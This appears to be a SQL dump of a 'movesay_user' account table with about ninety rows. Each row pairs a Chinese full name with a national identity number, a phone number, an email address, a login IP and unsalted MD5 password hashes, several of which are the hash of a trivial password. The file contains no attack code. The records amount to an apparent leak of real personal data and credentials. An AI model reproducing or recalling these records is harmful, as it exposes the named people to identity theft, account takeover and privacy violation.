INSERT INTO `movesay_user` VALUES ('5021', 'lss8001', '13514902888', '1505472160', 'e929c7dfee73418d5de201e8133b713e', '1', '6ca6c70f9ef565514e39d3c642f3f2f2', '0', '0', '0', '李树山', '341181197709290215', '0', '', '223.244.136.230', '未分配或者内网IP', '0', '1505471997', '0', '1', '447369515@qq.com', null, 'SUEFCJ', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5022', 'my111111', '13750572806', '1505473611', 'fa944bc6646289268283e5219eba4fd1', '1', 'e10adc3949ba59abbe56e057f20f883e', '0', '0', '0', '单希', '430624199203308959', '2', '', '14.24.111.200', '未分配或者内网IP', '0', '1505473611', '0', '2', '11@qq.com', null, 'MRUEXN', null, null);
INSERT INTO `movesay_user` VALUES ('5023', 'z13815072888', '13815072888', '1505475156', '5ee21eadee5f222e6898ca086663c564', '1', '17901a72ace5ee14098c464a1dd1f243', '0', '0', '0', '张志光', '320421195711300212', '0', '', '114.226.147.72', '未分配或者内网IP', '0', '1505474960', '0', '1', '3331393837@qq.com', null, 'IRKSUD', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5024', 'ken140628', '18088886522', '1505480938', 'd0970714757783e6cf17b26fb8e2298f', '1', '4297f44b13955235245b2497399d7a93', '0', '0', '0', '李为民', '440301197412158215', '0', '', '111.221.196.148', '未分配或者内网IP', '0', '1505479621', '0', '1', 'minweili2005@126.c', null, 'HBXYGM', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5025', 'f18747761511', '18747761511', '1505482863', 'e8c458707e3e37cbacf8591cdf4eb9c7', '1', '972ad75cbd65fcfc23321e4b0766af30', '0', '0', '0', '范旭景', '620522199012053559', '0', '', '182.144.85.116', '未分配或者内网IP', '0', '1505482718', '0', '1', '752745403@qq.com', '18747761511', 'WSDJRE', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5026', 'lygzlm', '', '0', '3e06c91f81a0bffb4fc5b27927646852', '1', 'e2276b1e228df5e27fc247aa410b1518', '4964', '0', '0', '张腊梅', '320723198601134025', '0', '', '113.66.71.5', '未分配或者内网IP', '0', '1505484065', '0', '1', '373492665@qq.com', null, 'XJDYEV', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5027', 'lygzs1', '', '0', '47d1620d07be2ec39f5cbf0203b53a21', '1', '4c53c1e0c12a2e37e1daa2439f9a6d24', '4964', '0', '0', '吉文学', '320723197708155657', '0', '', '218.205.35.208', '未分配或者内网IP', '0', '1505485166', '0', '1', 'jwx@texhong.com', null, 'HTSYNI', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5028', 'XueSong', '18501549999', '1505485898', 'a89bc75709f2e30a6c887132665159f0', '1', 'de338f49b76ec759f6244e02d13d246f', '0', '0', '0', '薛松', '320723198706052173', '0', '', '122.192.13.23', '未分配或者内网IP', '0', '1505485556', '0', '1', '28694033@qq.com', '18501549999', 'ZXYDAK', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5029', 'ldy888', '15050236348', '1505487643', '69b67f802d37c6ff55c6076dec3d9ead', '1', 'b54273b4f2b40602fe37de8389821b9e', '0', '0', '0', '刘定玉', '32108319711113123X', '3', '', '101.226.102.148', '未分配或者内网IP', '0', '1505485920', '0', '1', '1270213765@qq.com', '15050236348', 'ACJNLQ', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5030', 'lyggll831010', '', '0', 'f3709f14bcc46eb9a2d557d6f372bbed', '1', 'fb8ec9c33fa0a6d95623af50dc00eb31', '4964', '0', '0', '顾林林', '320723198310102824', '0', '', '101.226.125.118', '未分配或者内网IP', '0', '1505486065', '0', '1', '545940979@qq.com', null, 'PVUJXD', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5031', 'wjb234567', '18077683245', '1505486430', '6af3ea1897c1c670311ec0d13c47f45b', '1', '714cf41d5a95e50d5feb80674c5a3aba', '4964', '0', '0', '韦俊兵', '452601197111290335', '0', '', '14.17.37.72', '未分配或者内网IP', '0', '1505486123', '0', '1', '2260965416@qq.com', '13877684660', 'TYKNSA', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5032', 'x13820836679', '13820836679', '1505486994', '75e266f182b4fa3625d4a4f4f779af54', '1', 'c33367701511b4f6020ec61ded352059', '0', '0', '0', '张新乐', '23212619900201222x', '2', '', '61.158.146.184', '未分配或者内网IP', '0', '1505486319', '0', '1', '929295751@qq.com', null, 'DEYURP', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5033', 'l13305121789', '', '0', 'e6f1fefc4ef2b27ffd7524f27575aef2', '1', '6ab9bd9ed4fecf559eb4975938b44440', '4964', '0', '0', '刘婷', '320114198210040081', '0', '', '101.226.125.120', '未分配或者内网IP', '0', '1505486596', '0', '1', '13305121789@189.cn', null, 'MIHGDU', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5034', 'x15322873941', '15322873941', '1505487324', '75e266f182b4fa3625d4a4f4f779af54', '1', 'c33367701511b4f6020ec61ded352059', '0', '0', '0', '聂建德', '362424197212286492', '1', '', '61.158.146.184', '未分配或者内网IP', '0', '1505487007', '0', '1', '243246280@qq.com', null, 'JZUYND', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5035', 'x15514106166', '15514106166', '1505487949', '75e266f182b4fa3625d4a4f4f779af54', '1', 'c33367701511b4f6020ec61ded352059', '0', '0', '0', '张书霞', '41132619841115202x', '1', '', '61.158.146.184', '未分配或者内网IP', '0', '1505487630', '0', '1', '1157786361@qq.com', null, 'QEAZVM', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5036', 'yin668', '', '0', 'e10adc3949ba59abbe56e057f20f883e', '1', 'c33367701511b4f6020ec61ded352059', '0', '0', '0', ' 王亚', '412826198603146626', '1', '', '113.88.37.216', '未分配或者内网IP', '0', '1505488200', '0', '1', 'aqun_008@163.com', null, 'EAGSZD', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5037', 'gj3366', '', '0', '8ecde58d82fda4e36690ce4b3bd13846', '1', '3f9c0909871e7cf32a056e74a3bdc943', '0', '0', '0', '郭菊', '411202197504220529', '0', '', '1.195.243.31', '未分配或者内网IP', '0', '1505488336', '0', '1', 'j00168@sina.com', null, 'ZTHUSW', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5038', 'x15639119292', '15639119292', '1505488658', '75e266f182b4fa3625d4a4f4f779af54', '1', 'c33367701511b4f6020ec61ded352059', '0', '0', '0', '田梦潇', '410822199301132023', '0', '', '61.158.146.184', '未分配或者内网IP', '0', '1505488456', '0', '1', '1356911267@qq.com', null, 'ISFQLH', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5039', 'x13523655350', '13523655350', '1505489119', '75e266f182b4fa3625d4a4f4f779af54', '1', 'c33367701511b4f6020ec61ded352059', '0', '0', '0', '王成芳', '412921196104201525', '1', '', '61.158.146.184', '未分配或者内网IP', '0', '1505488930', '0', '1', '13523655350@qq.com', null, 'KLECTR', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5040', 'my123456', '', '0', 'b51d5af6c801ff4bfd31a4a154f35d35', '1', 'e10adc3949ba59abbe56e057f20f883e', '0', '0', '0', '单希', '430624199203308959', '2', '', '113.90.97.61', '未分配或者内网IP', '0', '1505791059', '0', '1', '12@qq.com', null, 'ZESVAH', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5048', 'w734944583', '18824580267', '1506322782', 'e10adc3949ba59abbe56e057f20f883e', '1', '25f9e794323b453885f5181f1b624d0b', '0', '0', '0', '张文如', '412727199001031245', '25', '', '119.139.175.227', '未分配或者内网IP', '0', '1506322612', '0', '1', '787572033@qq.com', null, 'CFNQHW', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5042', 'w12345', '', '0', 'e10adc3949ba59abbe56e057f20f883e', '1', '25f9e794323b453885f5181f1b624d0b', '0', '0', '0', '张文如', '412727199001031245', '0', '', '113.90.99.130', '未分配或者内网IP', '0', '1506044428', '0', '1', '1094646142@qq.com', null, 'ESUKYA', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5043', 'c12345', '13530769203', '1506054137', 'cc03e747a6afbbcbf8be7668acfebee5', '1', '47ec2dd791e31e2ef2076caf64ed9b3d', '0', '0', '0', '刘祖全', '512501197203035172', '0', '', '113.116.205.200', '未分配或者内网IP', '0', '1506053858', '0', '2', '11@q.com', null, 'DACHLF', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5044', 'test123', '', '0', 'cc03e747a6afbbcbf8be7668acfebee5', '1', '47ec2dd791e31e2ef2076caf64ed9b3d', '0', '0', '0', '李洪', '51052119850508797x', '2', '', '113.99.96.24', '未分配或者内网IP', '0', '1506156801', '0', '1', '112@q.com', null, 'YJXIGL', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5045', 'w123456', '13271611726', '1506043832', 'e10adc3949ba59abbe56e057f20f883e', '1', '25f9e794323b453885f5181f1b624d0b', '0', '0', '0', '张文如', '412727199001031245', '4', '', '113.90.96.160', '未分配或者内网IP', '0', '1506309038', '0', '2', '734944583@qq.com', null, 'NWYAGI', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5049', 'mmmmmm', '15100175516', '1506324203', '96e79218965eb72c92a549dd5a330112', '1', 'e3ceb5881a0a1fdaad01296d7554868d', '0', '0', '0', '边慧', '130105198201251248', '1', '', '110.249.163.154', '未分配或者内网IP', '0', '1506324203', '0', '1', null, null, 'WXTNJH', null, null);
INSERT INTO `movesay_user` VALUES ('5050', 'zwr123456', '13271611725', '1506474289', 'e10adc3949ba59abbe56e057f20f883e', '1', '25f9e794323b453885f5181f1b624d0b', '0', '0', '0', '张文如', '412727199001031245', '12', '', '119.139.175.227', '未分配或者内网IP', '0', '1506393945', '0', '1', '734944580@qq.com', null, 'UDIBHG', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5051', 'lgy999', '13632649455', '1506480784', '96e79218965eb72c92a549dd5a330112', '1', 'e3ceb5881a0a1fdaad01296d7554868d', '0', '0', '0', '单希', '430624199203308959', '1', '', '119.139.172.6', '未分配或者内网IP', '0', '1506480601', '0', '1', '15@qq.com', null, 'PVKJYE', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5052', 'shangmeidage', '13694303141', '1506508983', 'dc483e80a7a0bd9ef71d8cf973673924', '1', 'a5721016407ba20f8ff5c776f7026eb8', '0', '0', '0', '陈岩昆', '220103196906250616', '1', '', '61.163.130.2', '未分配或者内网IP', '0', '1506508290', '0', '1', '398558035@qq.com', '18679167265', 'SMGKZH', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5053', 'w123456789', '', '0', 'e10adc3949ba59abbe56e057f20f883e', '1', '25f9e794323b453885f5181f1b624d0b', '0', '0', '0', '', '', '0', '', '119.139.172.6', '未分配或者内网IP', '0', '1506579935', '0', '1', null, null, 'DNBALM', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5054', 'w61721112', '', '0', 'aef009b33c633696bfe4ad2d2c532924', '1', '6bbd52a949e3f265184a49f5c6c6e475', '0', '0', '0', '陈齐雅', '330323197511031423', '0', '', '183.130.66.180', '未分配或者内网IP', '0', '1507392264', '0', '1', '709685904@qq.com', null, 'JEKZVR', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5055', 'tym430', '', '0', 'e10adc3949ba59abbe56e057f20f883e', '1', 'c33367701511b4f6020ec61ded352059', '0', '0', '0', '童应明', '430202195510090031', '2', '', '175.10.40.216', '未分配或者内网IP', '0', '1509249195', '0', '1', 'toyimi@163.com', null, 'DABQYU', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5056', 'lxy177177', '', '0', 'f702ab6adaf6427bb53af53a9e87ccb6', '1', '3d5283b74d33a0238a97e5a61bccc97d', '0', '0', '0', '林守勇', '330327199009021718', '0', '', '60.181.186.231', '未分配或者内网IP', '0', '1509341549', '0', '1', '464450927@qq.com', null, 'JXAIYB', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5057', 'yl3001', '', '0', 'e3750176efac9d842af7439a8e0e3a7e', '1', '731982a033a5cc815ac03c8504abb748', '0', '0', '0', '丁跃龙', '320823197209076212', '1', '', '49.90.3.232', '未分配或者内网IP', '0', '1509622442', '0', '1', '1874552001@qq.com', null, 'TNXBKA', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5058', 'myworld', '18617126793', '1514876339', 'e995f27198e83ad251c71fb5fb9c49fe', '1', '0192023a7bbd73250516f069df18b500', '0', '0', '0', '吕希润', '530125199409122415', '58', '', '113.116.204.216', '未分配或者内网IP', '0', '1509677807', '0', '1', '3177517702@qq.com', null, 'BIHAVZ', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5059', 'gy5265', '', '0', 'a03eef448cef7b729a815669ec173cfa', '1', '58a4891bcf30767ced7cf72132d6ac4d', '0', '0', '0', '严新阳', '330721198208280033', '2', '', '125.117.212.191', '未分配或者内网IP', '0', '1509753986', '0', '1', '439471837@qq.com', null, 'JHBMNU', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5060', 'zwr123', '', '0', 'e10adc3949ba59abbe56e057f20f883e', '1', 'c33367701511b4f6020ec61ded352059', '0', '0', '0', '张文如', '412727199001031245', '0', '', '14.153.186.235', '未分配或者内网IP', '0', '1511164838', '0', '1', '734944583@qq.com', null, 'TUDZYH', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5061', 'w18874898456', '', '0', 'a6b06a7712c1acf220109ef6aeba6258', '1', '9b74cd2cdbfc15e95e32a722e1a21778', '0', '0', '0', '', '', '0', '', '117.136.89.70', '未分配或者内网IP', '0', '1511349045', '0', '1', null, null, 'LSBGKA', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5062', 'admin123', '', '0', 'e10adc3949ba59abbe56e057f20f883e', '1', '25f9e794323b453885f5181f1b624d0b', '0', '0', '0', '', '', '0', '', '113.91.150.81', '未分配或者内网IP', '0', '1512452971', '0', '1', null, null, 'JIEABL', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5063', 'memabo', '', '0', '83c5b3bd2a2394353c2a6033cee697fb', '1', 'e4683bdd967197e48f00ceebd7b852e2', '0', '0', '0', '马博', '41130219920206481x', '0', '', '14.19.114.218', '未分配或者内网IP', '0', '1512470829', '0', '1', '768174000@qq.com', null, 'VQRBJA', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5064', 'q13839458167', '13839458167', '1512721856', '25d55ad283aa400af464c76d713c07ad', '1', 'fbd8e9f7436e0e239982c5c1d0d71321', '0', '0', '0', '曲庆华', '412723198805078671', '0', '', '223.91.14.194', '未分配或者内网IP', '0', '1512721513', '0', '1', '976763252@qq.com', null, 'STQHYM', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5065', 'yjl13397629688', '', '0', 'd79cf5a1d6f27f0dbc1a104babd1c0fb', '1', 'd4e38a1f414b4ce109ef0f134487aedc', '0', '0', '0', '', '', '0', '', '222.243.224.89', '未分配或者内网IP', '0', '1512825477', '0', '1', null, null, 'DUNQPY', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5066', 'yjI13397629688', '', '0', 'd79cf5a1d6f27f0dbc1a104babd1c0fb', '1', 'd4e38a1f414b4ce109ef0f134487aedc', '0', '0', '0', '', '', '0', '', '222.243.224.89', '未分配或者内网IP', '0', '1512826471', '0', '1', null, null, 'YEXGMD', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5067', 'zjx1641718398', '18753224360', '1513097717', '10635925dea88cc08fafc973bf5addcf', '1', 'cbb3fa42def332ae3ba879750d99c8eb', '0', '0', '0', '卓家兴', '450330199411151014', '0', '', '27.38.119.165', '未分配或者内网IP', '0', '1513097390', '0', '1', '1641718398@qq.com', null, 'QSVNXT', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5068', 'yang1234', '', '0', '492927ea76c1f59245a57bd2c9acc4e1', '1', '3928fd6288f496166da7f58378d500fe', '0', '0', '0', '杨德惠', '510121196508250049', '0', '', '182.131.12.11', '未分配或者内网IP', '0', '1513384140', '0', '1', '409299967@qq.com', null, 'QFZIKY', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5069', 'leonnemo', '13620203376', '1513425859', 'd42b563ffc312b6ef9c979059a4bee06', '1', 'b8c771d5860e6b7914bef70b74a6d7be', '0', '0', '0', '贺钲钊', '430104199003072512', '0', '', '113.110.229.153', '未分配或者内网IP', '0', '1513425682', '0', '1', '3186470858@qq.com', null, 'KJMNRI', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5070', 'bc888822', '13877623619', '1513499675', '398eca5c5b080b956fd9d8988b970b08', '1', '1124d164518c8283f547aacc24852eae', '0', '0', '0', '刘炳新', '45262319590917421x', '0', '', '125.73.135.217', '未分配或者内网IP', '0', '1513498297', '0', '1', '498662645@qq.com', '13877623619', 'GCPWBK', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5071', 'bc8888222', '', '0', '398eca5c5b080b956fd9d8988b970b08', '1', '1124d164518c8283f547aacc24852eae', '0', '0', '0', '刘炳新', '45262319590917421X', '0', '', '125.73.135.217', '未分配或者内网IP', '0', '1513560188', '0', '1', '498662645@qq.com', '13877623619', 'KTCJWV', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5072', 'ybxcg1102', '18211249843', '1513608164', 'f06baf413b519a8c2ea5ada80e289ace', '1', '3507336af7c63f429897d42a792cc1d7', '0', '0', '0', '杨碧雪', '440825198911292163', '0', '', '223.73.146.189', '未分配或者内网IP', '0', '1513607787', '0', '1', '377829317@qq.com', '377829317@qq.com', 'IUYEBC', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5073', 'cjy8018', '', '0', 'e2ecc380194398c85a3458f42a3699a5', '1', '6ad6250bf59eff48004d8cffe10c5775', '0', '0', '0', '陈静', '612401198702106011', '0', '', '113.222.26.121', '未分配或者内网IP', '0', '1513652067', '0', '1', 'cjy8018@163.com', null, 'VHLEKB', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5076', 'lubenyang', '', '0', '84763b2074410315c090fbe4429751ef', '1', 'e6ad9d667d093ab01fccf3267101983e', '0', '0', '0', '卢本扬', '432524198904135116', '0', '', '222.240.86.189', '未分配或者内网IP', '0', '1513674033', '0', '1', 'lu.benyang@163.com', null, 'VQHPYB', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5075', 'cd123456', '', '0', 'e10adc3949ba59abbe56e057f20f883e', '1', 'c33367701511b4f6020ec61ded352059', '0', '0', '0', '单希', '430624199203308959', '1', '', '14.153.185.25', '未分配或者内网IP', '0', '1513664302', '0', '1', '1234@qq.com', null, 'PMNBVI', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5077', 'hao123', '18665929827', '1513849646', '06a5ac9504e3a3c83574cf7a6479be2d', '1', 'e10adc3949ba59abbe56e057f20f883e', '0', '0', '0', '黄俊豪', '441322199107272718', '2', '', '14.153.187.72', '未分配或者内网IP', '0', '1513849191', '0', '1', '2511146759@qq.com', null, 'PJYDLM', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5078', 'njprq1', '', '0', '9ffd81d397fd21c8e78a960855fb1352', '1', '158b684200b557af5b0604a2bf88de42', '0', '0', '0', '裴仁群', '342522197809025622', '0', '', '61.151.178.175', '未分配或者内网IP', '0', '1514083459', '0', '1', '445837465@qq.com', null, 'MBPEVA', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5079', 'a123456789', '', '0', 'e10adc3949ba59abbe56e057f20f883e', '1', 'e35cf7b66449df565f93c607d5a81d09', '0', '0', '0', '', '', '0', '', '106.19.6.40', '未分配或者内网IP', '0', '1514170971', '0', '1', null, null, 'HGTFDI', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5080', 'jinjin55', '13640984134', '1514173459', 'f028432dd360632012674b13ffd11c78', '1', '88a741d6039824a8cbd5a47cddea1f98', '0', '0', '0', ' 费雄强', '430621198609141710', '0', '', '106.19.6.40', '未分配或者内网IP', '0', '1514171848', '0', '1', '55685622@qq.com', null, 'ISMKTN', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5082', 'huang2514603', '', '0', 'e10adc3949ba59abbe56e057f20f883e', '1', '25f9e794323b453885f5181f1b624d0b', '0', '0', '0', '', '', '0', '', '14.153.184.243', '未分配或者内网IP', '0', '1514197106', '0', '1', null, null, 'NWHDBM', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5083', 'hao123', '18665929827', '1513849646', 'e10adc3949ba59abbe56e057f20f883e', '1', 'e10adc3949ba59abbe56e057f20f883e', '0', '0', '0', '黄俊豪', '441322199107272718', '0', '', '14.153.184.243', '未分配或者内网IP', '0', '1514288504', '0', '1', '2511146759@qq.com', null, 'RUDBKN', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5084', 'ly930707', '', '0', '49907004e55b6dd7d273c922aac270ac', '1', '24e279a2b9cefd0ff8410f3d310d4524', '0', '0', '0', '', '', '0', '', '218.56.149.126', '未分配或者内网IP', '0', '1514461977', '0', '1', null, null, 'XASLFT', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5085', 'yh6666', '', '0', '8a6f2805b4515ac12058e79e66539be9', '1', '141c4e962fc9b5079dbfb10136e611ac', '0', '0', '0', '于浩', '230206198310210539', '0', '', '61.129.7.254', '未分配或者内网IP', '0', '1514472321', '0', '1', '453500061@qq.com', null, 'DGXTKI', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5086', 'chl6666', '', '0', '8a6f2805b4515ac12058e79e66539be9', '1', 'd6c692b38390497e0c601d9665149f72', '0', '0', '0', '陈洪亮', '232302197912171351', '0', '', '222.94.116.97', '未分配或者内网IP', '0', '1514533047', '0', '1', '453500061@qq.com', null, 'CABFGV', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5087', 'wei124578', '', '0', '8b1b5b781c2cdffe0d3ab13a8377cf55', '1', 'af8e0ff9c042aeb22135ed679a2c5967', '0', '0', '0', '魏民', '132125197805010018', '0', '', '121.24.164.239', '未分配或者内网IP', '0', '1515111169', '0', '1', '978394648@qq.com', null, 'VNEIKA', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5088', 'xbw0823', '', '0', '992f9da6478aa58f1a85b0e37df4f82e', '1', '10baf0b5782e70806e22dd87384444e4', '0', '0', '0', '徐博闻', '330382198908231858', '0', '', '60.180.171.76', '未分配或者内网IP', '0', '1515205431', '0', '1', '471020704@qq.com', null, 'VKBZXL', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5089', 'brc131419', '', '0', 'b4a918cb17467d92a17d9af2c1c89e46', '1', '5a8123cf9d8a8a7d98da7adcebcb155c', '0', '0', '0', '边小敏', '420606197011210021', '0', '', '116.208.8.50', '未分配或者内网IP', '0', '1515226033', '0', '1', '13135864131@163.co', null, 'XCYADI', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5090', 'bxm131419', '', '0', '5a8123cf9d8a8a7d98da7adcebcb155c', '1', '7b55209e8f4abe95e4d734b3ed8a300f', '0', '0', '0', '边小敏', '420606197011210021', '0', '', '116.208.8.50', '未分配或者内网IP', '0', '1515235100', '0', '1', '13135864131@163.com', null, 'FWKPYQ', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5091', 'ac131419', '', '0', '5a8123cf9d8a8a7d98da7adcebcb155c', '1', '7b55209e8f4abe95e4d734b3ed8a300f', '0', '0', '0', '边小敏', '420606197011210021', '0', '', '116.208.8.50', '未分配或者内网IP', '0', '1515235605', '0', '1', '13135864131@163.com', null, 'CQRXLW', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5092', 'lihui340421', '', '0', 'e2b18ddb570bb7179c5024bd79d14d53', '1', '1e8b0fdf3f75be20eee36a89788d98f9', '0', '0', '0', '', '', '0', '', '58.243.250.94', '未分配或者内网IP', '0', '1515404091', '0', '1', null, null, 'JEMXYN', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5093', 'menjiang', '', '0', 'e2b18ddb570bb7179c5024bd79d14d53', '1', '1e8b0fdf3f75be20eee36a89788d98f9', '0', '0', '0', '', '', '0', '', '113.241.103.252', '未分配或者内网IP', '0', '1515404264', '0', '1', null, null, 'GIZULS', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5094', 'lihuilihui', '', '0', '12631fe68f6bbd8af101871c853993f6', '1', '1e8b0fdf3f75be20eee36a89788d98f9', '0', '0', '0', '李辉', '340421199202020812', '0', '', '113.241.103.252', '未分配或者内网IP', '0', '1515405161', '0', '1', '975661792@qq.com', null, 'CQZHJS', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5095', 'myworld123', '13227019291', '1515411741', 'e995f27198e83ad251c71fb5fb9c49fe', '1', 'b2ba5c559ee003029eeba161f8e36586', '0', '0', '0', '林华', '512501197506045175', '6', '', '14.153.184.43', '未分配或者内网IP', '0', '1515410822', '0', '1', '512501@qq.com', null, 'ZTKCME', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5096', 'w734944583', '18824580267', '1506322782', 'e10adc3949ba59abbe56e057f20f883e', '1', 'e10adc3949ba59abbe56e057f20f883e', '0', '0', '0', '张文如', '412727199001031245', '0', '', '14.153.184.169', '未分配或者内网IP', '0', '1515488642', '0', '1', '787572033@qq.com', null, 'SAJTYX', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5097', 'l13307791677', '', '0', 'd3647cd95772161d520d3747b892d7f9', '1', '365798cd9b12aa7658505f59ef05ebf1', '0', '0', '0', '林述萍', '450502197711061367', '0', '', '124.226.244.199', '未分配或者内网IP', '0', '1515638768', '0', '1', '1363560917@qq.com', null, 'TGQJKY', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5098', 'w99999', '', '0', '114c898bc50c56d9c8596837324e2783', '1', '93b13ae31f4cf09e99b790dd075c3068', '0', '0', '0', '', '', '0', '', '101.45.25.249', '未分配或者内网IP', '0', '1516007766', '0', '1', null, null, 'AUWGQD', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5099', 'mmx1100', '', '0', '8a8c7a7ac1851211b0387c207795adba', '1', '857dbebc76af615f91477a04a5d8865f', '0', '0', '0', '缪茂锡', '330327198708080253', '0', '', '123.154.192.29', '未分配或者内网IP', '0', '1516156000', '0', '1', '361878577@qq.com', null, 'JZGFQR', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5100', 'lgy666', '18610137343', '1516520104', 'dc483e80a7a0bd9ef71d8cf973673924', '1', 'ebe29ff9e7abc4dcf709e52004cc5202', '0', '0', '0', '娄根永', '410221198003204857', '0', '', '61.148.243.167', '未分配或者内网IP', '0', '1516519631', '0', '1', 'lvwaipo@126.com', null, 'BSVUTG', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5101', 'sddz8392828', '', '0', '3ee1f734d63bb84f16529f4afeab7201', '1', '1e5b6ee965476ca9a9939cee11c133e5', '0', '0', '0', '李勤国', '372401197803116433', '0', '', '27.222.251.219', '未分配或者内网IP', '0', '1516615395', '0', '1', '503056151@qq.com', null, 'EHVCNG', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5102', 'bailiuyu', '', '0', 'fadeb62b77cb507ce160d5a34d6f0075', '1', '', '0', '0', '0', '', '', '0', '', '112.17.240.107', '未分配或者内网IP', '0', '1516677578', '0', '1', null, null, 'LSCKTU', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5103', 'songjiazhi', '', '0', 'e8241050461ddc13cdbeddc30c91b5dc', '1', '581e3a59e18a8e36dbdad4c9655fa8af', '0', '0', '0', '宋家志', '320721197001122816', '0', '', '180.105.174.51', '未分配或者内网IP', '0', '1516773637', '0', '1', '23981940@qq.com', null, 'YTGWZQ', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5104', 'yyb518', '', '0', '9cbf8a4dcb8e30682b927f352d6559a0', '1', '97cec69403988ad1bc488677e6dd88cd', '0', '0', '0', '杨永宾', '140322199002103318', '0', '', '218.26.179.4', '未分配或者内网IP', '0', '1516851282', '0', '1', '474753378@qq.com', null, 'YHEWRF', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5105', 'qwer123', '13067394759', '1516953724', 'd0dcbf0d12a6b1e7fbfa2ce5848f3eff', '1', 'd7340d7e38fbcbafc6d76ef5836670a2', '0', '0', '0', '赖小梅', '350821198507190424', '0', '', '220.249.163.131', '未分配或者内网IP', '0', '1516953245', '0', '1', '111222@q.comq', null, 'KCZSYF', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5106', 'tb21087857', '', '0', '3b2787b0113bfa39282acca593f5309f', '1', '29a4502558c60b7da138d3c90edb72d6', '0', '0', '0', '韩彭飞', '410521198909146514', '0', '', '171.117.70.94', '未分配或者内网IP', '0', '1517024736', '0', '1', '504290632@qq.com', null, 'ACIVDL', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5107', 'woyangxing', '', '0', '05cc65dc241fa9a500bc41a9d09615d4', '1', 'a420384997c8a1a93d5a84046117c2aa', '0', '0', '0', '杨鑫', '42120219850329109x', '0', '', '61.184.179.44', '未分配或者内网IP', '0', '1517192136', '0', '1', '2601724753@qq.com', null, 'HIZBLN', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5108', 'hexiaoduan', '', '0', 'cfaf167d7baddcc241823ec3e19cf0db', '1', '182470cb6b41262eaf21ee80f19e3063', '0', '0', '0', '何小端', '441501199405105220', '0', '', '119.130.202.41', '未分配或者内网IP', '0', '1517274151', '0', '1', '443525013@qq.com', null, 'IERXNT', null, 'CN');
INSERT INTO `movesay_user` VALUES ('5109', 'weiwei', '', '0', 'f4c4c63e1bd4b7016b566602ecb32219', '1', 'e067c54879c0f42bb79a1ed5c326d386', '0', '0', '0', '魏维斌', '350600197910272019', '0', '', '140.243.7.56', '未分配或者内网IP', '0', '1517790797', '0', '1', '576858668@qq.com', null, 'PQMDYT', null, 'CN');
